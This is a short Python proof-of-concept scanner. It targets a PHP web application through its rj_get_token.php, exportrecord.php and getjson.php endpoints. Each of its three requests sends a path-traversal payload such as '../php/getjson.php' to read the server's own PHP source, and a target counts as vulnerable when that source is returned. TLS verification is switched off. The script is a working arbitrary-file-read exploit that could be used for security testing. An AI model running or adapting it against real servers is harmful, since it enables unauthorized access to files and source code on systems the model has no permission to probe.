import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"php/rj_get_token.php"
	body="jsondata[url]=../php/getjson.php"
	headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "require_once ('conversion.php');" in response.text and "$json_string = file_get_contents($fullpath);" in response.text:
		r1=True
	else:
		r1=False
	url=baseurl+"php/exportrecord.php?downname=../php/getjson.php"
	headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "require_once ('conversion.php');" in response.text and "$json_string = file_get_contents($fullpath);" in response.text:
		r2=True
	else:
		r2=False
	url=baseurl+"php/getjson.php"
	body="jsondata[filename]=../php/getjson.php"
	headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "require_once ('conversion.php');" in response.text and "$json_string = file_get_contents($fullpath);" in response.text:
		r3=True
	else:
		r3=False
	if r1 or r2 or r3:
		return True
	else:
		return False
